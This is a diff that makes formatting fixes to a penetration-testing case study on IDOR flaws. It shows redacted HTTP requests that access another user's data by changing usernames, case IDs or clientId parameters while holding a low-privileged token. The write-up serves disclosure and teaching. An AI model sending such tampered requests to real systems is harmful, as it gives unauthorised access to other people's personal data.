@@ -55,14 +55,14 @@ In this case study, we will explore a scenario where a critical Insecure Direct 
 
 **Request:**
 ```http
-GET /cases-api/getUserByUsername?username=AdminUser HTTP/2  
-Host: <REDACTED> 
-Cookie: <REDACTED>  
+GET /cases-api/getUserByUsername?username=AdminUser HTTP/1.1
+Host: <REDACTED>
+Cookie: <REDACTED>
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36  
-Accept: application/json, text/plain, */*  
-X-Requested-With: XMLHttpRequest  
-Referer: https://<REDACTED>/cases/create  
-Accept-Encoding: gzip, deflate  
+Accept: application/json, text/plain, */*
+X-Requested-With: XMLHttpRequest
+Referer: https://<REDACTED>/cases/create
+Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 ```
 
@@ -160,7 +160,7 @@ GET /api/exports/zip/download/<CASE_ID> HTTP/2
 Host: <REDACTED>
 ﻿﻿Cookie: <REDACTED>
 ﻿﻿Referer: <REDACTED>
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; X64) AppleWebKit/537.36  
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; X64) AppleWebKit/537.36
 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
 Accept-Encoding: gzip, deflate
 ﻿﻿﻿Accept-Language: en-GB, en-US; q=0.9, en; q=0.8
@@ -200,44 +200,43 @@ We identified a _**clientId**_ parameter within a POST request initiated to `/a
 **Request:**
 
 ```http
-POST /api/user/userUpdateManagement HTTP/2  
-Host: <REDACTED> 
-Accept: application/json, text/javascript, */*; q=0.01  
-Content-Type: application/json  
-Authorization: Bearer <LOWEST PRIVILEGED USER's TOKEN>  
-Content-Length: 1652  
+POST /api/user/userUpdateManagement HTTP/2
+Host: <REDACTED>
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/json
+Authorization: Bearer <LOWEST PRIVILEGED USER's TOKEN>
+Content-Length: 1652
 Origin: https://redacted.co.uk
 Referer: https://redacted.co.uk
 
-{  
-  "errors": [],  
-  "warnings": [],   
-  "Password": "REDACTED",    
-  "deleted": false,  
-  "name": "Punit",  
-  "emailAddress": "punit@redacted.co.uk",  
-  "username": "PenTest9",  
-  "firstName": "Punit",  
-  "middleName": null,  
+{
+  "errors": [],
+  "warnings": [],
+  "Password": "REDACTED",
+  "deleted": false,
+  "name": "Punit",
+  "emailAddress": "punit@redacted.co.uk",
+  "username": "PenTest9",
+  "firstName": "Punit",
+  "middleName": null,
   "lastName": null,  
-  "clientId": 5646,  
-  "setInactive": false,  
-  "id": 63891,  
-  "created": "2022-03-28T14:21:24.257",  
-  "modified": "2023-05-12T14:49:00.003",  
-  "latestInviteTimeStamp": "2023-05-05T15:43:15.367",  
-  "accessAreas": 1,  
-  "createdUser": {  
-    "name": "Sys Admin",  
-    "id": 63887  
+  "clientId": 5646,
+  "setInactive": false,
+  "id": 63891,
+  "created": "2022-03-28T14:21:24.257",
+  "modified": "2023-05-12T14:49:00.003",
+  "latestInviteTimeStamp": "2023-05-05T15:43:15.367",
+  "accessAreas": 1,
+  "createdUser": {
+    "name": "Sys Admin",
+    "id": 63887
   },  
-  "modifiedUser": {  
-    "name": "Sys Admin",  
-    "id": 63887  
+  "modifiedUser": {
+    "name": "Sys Admin",
+    "id": 63887
   }
 
-_..[SNIP].._  
-
+_..[SNIP].._
 }
 ```
 
@@ -329,7 +328,7 @@ Content-Type: application/json
     "zip_code": "54321",
     "employee_status": "REDACTED"
     "passport_URL": "REDACTED",
-    "Contract_URL" "REDACTED"
+    "Contract_URL": "REDACTED"
   },
   \\SNIP\\
 ]
@@ -340,10 +339,10 @@ We verified the presence of an IDOR vulnerability, but obtaining the UUIDs of ot
 
 **Request:**
 ```http
-POST /api/organistaion/?e=punit@redacted.com HTTP/2  
-Host: <REDACTED> 
-Accept: application/json, text/javascript, */*; q=0.01  
-Content-Type: application/json  
+POST /api/organistaion/?e=punit@redacted.com HTTP/2
+Host: <REDACTED>
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/json
 Origin: https://redacted.co.uk
 Referer: https://redacted.co.uk
 
